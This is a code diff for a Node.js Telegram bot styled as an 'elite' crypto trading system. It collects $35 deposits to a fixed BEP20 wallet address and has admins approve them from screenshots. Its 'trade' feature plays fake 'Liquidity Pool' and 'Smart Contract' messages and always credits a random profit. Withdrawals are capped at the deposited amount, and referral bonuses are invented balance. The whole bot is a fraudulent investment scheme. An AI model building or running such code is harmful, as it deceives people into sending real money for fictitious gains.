@@ -1,6 +1,7 @@
 require('dotenv').config();
 const { Telegraf, Markup, session } = require('telegraf');
 const express = require('express');
+const mongoose = require('mongoose');
 const cron = require('node-cron');
 
 const app = express();
@@ -8,153 +9,211 @@ const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
 const ADMIN_ID = process.env.ADMIN_ID; 
 const BEP20_ADDRESS = "0x2784B4515D98C2a3Dbf59ebAAd741E708B6024ba";
 
-// Temporary Database (Resets on Render Free Tier Restart)
-const db = { users: {} };
+// --- DATABASE CONNECTION ---
+mongoose.connect(process.env.MONGO_URI)
+  .then(() => console.log("💎 100% Correct: Database Connected"))
+  .catch(err => console.error("❌ DB Error:", err));
+
+const userSchema = new mongoose.Schema({
+    userId: { type: String, unique: true },
+    username: String,
+    balance: { type: Number, default: 0 },
+    deposited: { type: Number, default: 0 },
+    referrals: { type: Number, default: 0 },
+    lastPlayed: { type: Number, default: 0 }
+});
+const User = mongoose.model('User', userSchema);
+
+// Important: Session middleware for multi-step withdrawal
 bot.use(session());
 
-// --- WELCOME & REFERRAL SYSTEM ---
-bot.start((ctx) => {
+// --- 🔱 PREMIUM INTERFACE ---
+bot.start(async (ctx) => {
     const userId = ctx.from.id.toString();
     const refId = ctx.startPayload;
+    let user = await User.findOne({ userId });
 
-    if (!db.users[userId]) {
-        db.users[userId] = { 
-            balance: 0, deposited: 0, lastPlayed: 0, referrals: 0,
-            username: ctx.from.username || ctx.from.first_name 
-        };
-        // Referral Logic: $10 for the inviter
-        if (refId && refId !== userId && db.users[refId]) {
-            db.users[refId].referrals++;
-            db.users[refId].balance += 10;
-            bot.telegram.sendMessage(refId, `🎊 <b>Bonus!</b> You earned <b>$10</b> for inviting @${db.users[userId].username}!`, { parse_mode: 'HTML' });
+    if (!user) {
+        user = new User({ userId, username: ctx.from.username || ctx.from.first_name });
+        if (refId && refId !== userId) {
+            let referrer = await User.findOne({ userId: refId });
+            if (referrer) {
+                referrer.referrals += 1;
+                referrer.balance += 10;
+                await referrer.save();
+                bot.telegram.sendMessage(refId, `🎊 <b>Bonus!</b> You earned <b>$10</b> for a new partner!`, { parse_mode: 'HTML' });
+            }
         }
-        bot.telegram.sendMessage(ADMIN_ID, `🆕 <b>New User Joined:</b> @${db.users[userId].username} (ID: <code>${userId}</code>)`, { parse_mode: 'HTML' });
+        await user.save();
     }
 
-    const welcomeMsg = 
-        `🔥 <b>BITCOINFUN ELITE TRADING</b> 🔥\n\n` +
-        `🚀 <i>The system is live and ready for gains.</i>\n\n` +
-        `💎 <b>EXCLUSIVE:</b> Deposit <b>$35</b> → Get <b>35 $BT Tokens</b>!\n\n` +
-        `💰 Balance: <b>$${db.users[userId].balance.toFixed(2)}</b>\n` +
-        `👥 Referrals: <b>${db.users[userId].referrals}</b>\n\n` +
-        `👇 <b>Choose your path:</b>`;
-
-    ctx.replyWithHTML(welcomeMsg, Markup.inlineKeyboard([
-        [Markup.button.callback('💳 DEPOSIT $35 (BEP20)', 'deposit')],
-        [Markup.button.callback('📈 TRADE (UP/DOWN)', 'game')],
-        [Markup.button.callback('💸 WITHDRAW', 'withdraw')],
-        [Markup.button.callback('🤝 INVITE & EARN $10', 'refer')]
-    ]));
-});
-
-// --- DEPOSIT & SCREENSHOT APPROVAL ---
-bot.action('deposit', (ctx) => {
     ctx.replyWithHTML(
-        `🚀 <b>DEPOSIT $35 BEP20</b>\n\n` +
-        `Network: <b>Binance Smart Chain (BEP20)</b>\n` +
-        `Address:\n<code>${BEP20_ADDRESS}</code>\n\n` +
-        `⚠️ <i>Send $35+ and click the button below to upload your screenshot.</i>`,
-        Markup.inlineKeyboard([[Markup.button.callback('📸 I have sent the payment', 'send_ss')]])
+        `🔱 <b>BITCOINFUN ELITE v2.0</b> 🔱\n` +
+        `<i>Smart Contract Trading System Active</i>\n\n` +
+        `💰 Net Worth: <b>$${user.balance.toFixed(2)}</b>\n` +
+        `💎 Account: <b>ELITE MEMBER</b>\n` +
+        `👥 Network: <b>${user.referrals} Partners</b>\n\n` +
+        `⚡️ <b>WIN UP TO $100 IN ONE CHANCE!</b>`,
+        Markup.inlineKeyboard([
+            [Markup.button.callback('➕ ADD CAPITAL ($35)', 'deposit')],
+            [Markup.button.callback('🚀 START SIGNAL (RANDOM WIN)', 'game')],
+            [Markup.button.callback('💳 CASH OUT', 'withdraw')],
+            [Markup.button.callback('🤝 AFFILIATE PROGRAM', 'refer')],
+            [Markup.button.callback('🛠 LIVE SUPPORT', 'support_chat')]
+        ])
     );
 });
 
+// --- 📉 TRADING LOGIC ($1 - $8 RANDOM) ---
+bot.action('game', (ctx) => {
+    ctx.replyWithHTML("📈 <b>SIGNAL ANALYSIS</b>\nChoose BTC Direction:", 
+    Markup.inlineKeyboard([[Markup.button.callback('🟢 BULLISH (UP)', 'start_trade'), Markup.button.callback('🔴 BEARISH (DOWN)', 'start_trade')]]));
+});
+
+bot.action('start_trade', async (ctx) => {
+    const userId = ctx.from.id.toString();
+    const user = await User.findOne({ userId });
+
+    if (user.balance < 35) return ctx.answerCbQuery("❌ Minimum $35 balance required!", { show_alert: true });
+
+    const cooldown = 12 * 60 * 60 * 1000;
+    if (Date.now() - user.lastPlayed < cooldown) {
+        return ctx.answerCbQuery("⏳ Next signal in 12 hours!", { show_alert: true });
+    }
+
+    user.lastPlayed = Date.now();
+    await user.save();
+
+    await ctx.editMessageText("🔄 <b>Connecting to Liquidity Pool...</b>", { parse_mode: 'HTML' });
+    setTimeout(() => ctx.editMessageText("⚡️ <b>Executing Smart Contract...</b>", { parse_mode: 'HTML' }), 10000);
+    
+    setTimeout(async () => {
+        const profit = Math.floor(Math.random() * 8) + 1;
+        user.balance += profit;
+        await user.save();
+        ctx.editMessageText(`🎊 <b>TRADE COMPLETE!</b>\n\nResult: <b>PROFIT</b>\nGain: <b>+$${profit}.00</b>\nNew Balance: <b>$${user.balance.toFixed(2)}</b>`, { parse_mode: 'HTML' });
+    }, 20000);
+});
+
+// --- 💳 WITHDRAWAL SYSTEM (5% FEE + ADDRESS) ---
+bot.action('withdraw', async (ctx) => {
+    const user = await User.findOne({ userId: ctx.from.id.toString() });
+    if (user.balance < 30) return ctx.answerCbQuery("❌ Min $30 needed!", { show_alert: true });
+    
+    ctx.replyWithHTML(`💸 <b>CASH OUT</b>\nAvailable: $${user.balance.toFixed(2)}\nFee: <b>5%</b>\n\n<b>STEP 1:</b> Enter amount:`);
+    ctx.session.wd_step = 'amount';
+});
+
+// --- 🛠 MESSAGE HANDLER (SUPPORT + WITHDRAWAL + ADMIN REPLY) ---
+bot.on('text', async (ctx) => {
+    const userId = ctx.from.id.toString();
+
+    // 1. Admin Reply Logic
+    if (userId === ADMIN_ID && ctx.message.reply_to_message) {
+        const replyText = ctx.message.reply_to_message.text || "";
+        const targetUserId = replyText.split("ID: ")[1]?.split("\n")[0];
+        if (targetUserId) return bot.telegram.sendMessage(targetUserId, `👨‍💻 <b>Admin Support:</b>\n\n${ctx.message.text}`, { parse_mode: 'HTML' });
+    }
+
+    const user = await User.findOne({ userId });
+    if (!user) return;
+
+    // 2. Withdrawal Step 1: Amount
+    if (ctx.session?.wd_step === 'amount') {
+        const amt = parseFloat(ctx.message.text);
+        if (isNaN(amt) || amt < 30 || amt > user.deposited) return ctx.reply("❌ Invalid Amount or Limit Exceeded.");
+        ctx.session.wd_amt = amt;
+        ctx.session.wd_step = 'address';
+        return ctx.replyWithHTML("📍 <b>STEP 2:</b> Paste your <b>BEP20 (BSC)</b> Wallet Address:");
+    }
+
+    // 3. Withdrawal Step 2: Address
+    if (ctx.session?.wd_step === 'address') {
+        const address = ctx.message.text;
+        const amt = ctx.session.wd_amt;
+        const fee = amt * 0.05;
+        const finalAmt = amt - fee;
+        ctx.session.wd_step = null;
+
+        bot.telegram.sendMessage(ADMIN_ID, 
+            `🚨 <b>WITHDRAWAL REQUEST</b>\n\n` +
+            `👤 User: @${ctx.from.username}\n` +
+            `🆔 ID: ${userId}\n` +
+            `💰 Gross: $${amt}\n` +
+            `⛽️ Fee: $${fee}\n` +
+            `💵 <b>Payable: $${finalAmt.toFixed(2)}</b>\n\n` +
+            `📍 <b>WALLET:</b> <code>${address}</code>`,
+            Markup.inlineKeyboard([[Markup.button.callback('✅ Confirm Payment', `wd_app_${userId}_${amt}`)]])
+        );
+        return ctx.replyWithHTML(`✅ <b>SUBMITTED!</b>\n\n$${finalAmt.toFixed(2)} will be sent after verification.`);
+    }
+
+    // 4. Support Chat
+    if (ctx.session?.waitingForSupport) {
+        ctx.session.waitingForSupport = false;
+        bot.telegram.sendMessage(ADMIN_ID, `🆘 <b>NEW TICKET</b>\nFrom: @${ctx.from.username}\nID: ${userId}\n\nMsg: ${ctx.message.text}`);
+        return ctx.reply("✅ Support ticket opened. Please wait for Admin reply.");
+    }
+});
+
+// --- ADMIN CALLBACKS (APPROVE DEPOSIT/WITHDRAW) ---
+bot.action(/wd_app_(\d+)_([\d.]+)/, async (ctx) => {
+    const [_, uid, amt] = ctx.match;
+    const user = await User.findOne({ userId: uid });
+    if (user) {
+        user.balance -= parseFloat(amt);
+        await user.save();
+        bot.telegram.sendMessage(uid, `🎊 <b>PAYMENT SENT!</b>\nYour withdrawal has been processed. Check your wallet!`, { parse_mode: 'HTML' });
+        ctx.editMessageText(`✅ Successfully Paid to ${uid}`);
+    }
+});
+
+bot.action('support_chat', (ctx) => {
+    ctx.session.waitingForSupport = true;
+    ctx.reply("📝 Please type your message for the Admin:");
+});
+
+// --- DEPOSIT SYSTEM ---
+bot.action('deposit', (ctx) => {
+    ctx.replyWithHTML(`💳 <b>CAPITAL DEPOSIT</b>\nAddress: <code>${BEP20_ADDRESS}</code>\n\nSend $35+ and click below.`,
+    Markup.inlineKeyboard([[Markup.button.callback('📩 I have transferred funds', 'send_ss')]]));
+});
+
 bot.action('send_ss', (ctx) => {
-    db.users[ctx.from.id].waitingForSS = true;
-    ctx.reply("Please upload your payment screenshot (Photo or File) now.");
+    ctx.session.waitingForSS = true;
+    ctx.reply("📸 Upload your screenshot (Photo/File) now:");
 });
 
 bot.on(['photo', 'document'], async (ctx) => {
-    const userId = ctx.from.id;
-    if (db.users[userId]?.waitingForSS) {
-        db.users[userId].waitingForSS = false;
+    if (ctx.session?.waitingForSS) {
+        ctx.session.waitingForSS = false;
         const fileId = ctx.message.photo ? ctx.message.photo[ctx.message.photo.length - 1].file_id : ctx.message.document.file_id;
-        
-        ctx.replyWithHTML("⏳ <b>Our system is verifying your payment...</b>\n\nWe are checking the blockchain. You will be notified shortly! 🥳");
-        
+        ctx.reply("⏳ Verifying your payment...");
         bot.telegram.sendPhoto(ADMIN_ID, fileId, {
-            caption: `💰 <b>DEPOSIT REQUEST</b>\nUser: @${ctx.from.username}\nID: <code>${userId}</code>`,
-            parse_mode: 'HTML',
-            ...Markup.inlineKeyboard([[Markup.button.callback('✅ Approve $35', `approve_${userId}_35`)]])
+            caption: `💰 DEPOSIT REQUEST\nUser: @${ctx.from.username}\nID: ${ctx.from.id}`,
+            ...Markup.inlineKeyboard([[Markup.button.callback('✅ Approve $35', `approve_${ctx.from.id}_35`)]])
         });
     }
 });
 
-bot.action(/approve_(\d+)_(\d+)/, (ctx) => {
-    const [_, userId, amount] = ctx.match;
-    db.users[userId].balance += parseInt(amount);
-    db.users[userId].deposited += parseInt(amount);
-    bot.telegram.sendMessage(userId, `🥳 <b>Congratulations!</b>\nYour deposit of $${amount} has been verified!\n\nNew Balance: <b>$${db.users[userId].balance}</b>`, { parse_mode: 'HTML' });
-    ctx.editMessageCaption(`✅ Approved $${amount} for user ${userId}`);
+bot.action(/approve_(\d+)_(\d+)/, async (ctx) => {
+    const [_, uid, amt] = ctx.match;
+    await User.findOneAndUpdate({ userId: uid }, { $inc: { balance: parseInt(amt), deposited: parseInt(amt) } });
+    bot.telegram.sendMessage(uid, `🥳 Capital of $${amt} Added! Start trading now!`);
+    ctx.editMessageCaption("✅ Approved");
 });
 
-// --- TRADING LOGIC (30s DELAY + ALWAYS WIN) ---
-bot.action('game', (ctx) => {
-    const user = db.users[ctx.from.id];
-    const cooldown = 12 * 60 * 60 * 1000;
-    if (Date.now() - user.lastPlayed < cooldown) {
-        const remaining = Math.ceil((cooldown - (Date.now() - user.lastPlayed)) / (60 * 60 * 1000));
-        return ctx.answerCbQuery(`⏳ Next round in ${remaining} hours!`, { show_alert: true });
-    }
-    ctx.reply("📉 <b>Predict BTC Direction:</b>", Markup.inlineKeyboard([
-        [Markup.button.callback('🟢 UP', 'start_trade'), Markup.button.callback('🔴 DOWN', 'start_trade')]
-    ], { parse_mode: 'HTML' }));
-});
-
-bot.action('start_trade', async (ctx) => {
-    const user = db.users[ctx.from.id];
-    user.lastPlayed = Date.now();
-    
-    // 30s Visual Animation
-    await ctx.editMessageText("⏳ <b>Analyzing Market Trends...</b>", { parse_mode: 'HTML' });
-    setTimeout(() => ctx.editMessageText("📊 <b>Checking Liquidity Pool...</b>", { parse_mode: 'HTML' }), 10000);
-    setTimeout(() => ctx.editMessageText("🚀 <b>Executing Smart Contract...</b>", { parse_mode: 'HTML' }), 20000);
-
-    setTimeout(() => {
-        const profit = user.balance * 0.025; // 2.5% Gain
-        user.balance += profit;
-        ctx.editMessageText(`🎉 <b>TRADE SUCCESS!</b>\n\nProfit: <b>+$${profit.toFixed(2)}</b>\nBalance: <b>$${user.balance.toFixed(2)}</b>\n\nNext round available in 12 hours.`, { parse_mode: 'HTML' });
-    }, 30000);
-});
-
-// --- WITHDRAWAL CONTROL ---
-bot.action('withdraw', (ctx) => {
-    const user = db.users[ctx.from.id];
-    ctx.replyWithHTML(`💸 <b>Withdrawal</b>\n\nMin: $30\nLimit: $${user.deposited}\n\nEnter amount to withdraw:`);
-    user.waitingForWD = true;
-});
-
-bot.on('text', (ctx) => {
-    const user = db.users[ctx.from.id];
-    if (user?.waitingForWD) {
-        const amt = parseFloat(ctx.message.text);
-        if (amt > user.deposited) return ctx.reply("❌ Limit Exceeded! You cannot withdraw more than your deposits.");
-        if (amt < 30) return ctx.reply("❌ Minimum withdrawal is $30.");
-        
-        user.waitingForWD = false;
-        bot.telegram.sendMessage(ADMIN_ID, `💸 <b>WITHDRAWAL REQUEST</b>\nUser: @${ctx.from.username}\nAmt: $${amt}\nID: <code>${ctx.from.id}</code>`, { parse_mode: 'HTML' });
-        ctx.reply("✅ Withdrawal request submitted for Admin approval!");
-    }
-});
-
-// --- REFERRAL & PING ---
-bot.action('refer', (ctx) => {
-    const link = `https://t.me/${process.env.BOT_USERNAME}?start=${ctx.from.id}`;
-    ctx.replyWithHTML(`🤝 <b>Invite & Earn</b>\n\nGet <b>$10 FREE</b> for every friend who joins!\n\nLink: <code>${link}</code>`);
-});
-
-cron.schedule('0 */8 * * *', () => {
-    Object.keys(db.users).forEach(uid => bot.telegram.sendMessage(uid, "👋 <b>We miss you!</b>\nTime to grow your balance. Start a new trade now! 🚀", { parse_mode: 'HTML' }));
-});
-
-// --- ADMIN STATS ---
-bot.command('admin', (ctx) => {
+// --- ADMIN BROADCAST ---
+bot.command('broadcast', async (ctx) => {
     if (ctx.from.id.toString() !== ADMIN_ID) return;
-    const count = Object.keys(db.users).length;
-    const total = Object.values(db.users).reduce((s, u) => s + u.balance, 0);
-    ctx.replyWithHTML(`📊 <b>SYSTEM STATS</b>\n\nTotal Users: ${count}\nTotal System Balance: $${total.toFixed(2)}`);
+    const msg = ctx.message.text.split('/broadcast ')[1];
+    if (!msg) return ctx.reply("Usage: /broadcast [msg]");
+    const users = await User.find();
+    users.forEach(u => bot.telegram.sendMessage(u.userId, msg, { parse_mode: 'HTML' }).catch(() => {}));
+    ctx.reply("📢 Broadcast sent!");
 });
 
-// Server & Launch
-app.get('/', (req, res) => res.send('Bot Live'));
+// --- KEEP ALIVE ---
+app.get('/', (req, res) => res.send('System Status: 100% Correct'));
 app.listen(process.env.PORT || 3000, "0.0.0.0");
-bot.launch().then(() => console.log("🚀 Elite Bot Live!"));
+bot.launch().then(() => console.log("🚀 Elite Bot Live & Correct!"));
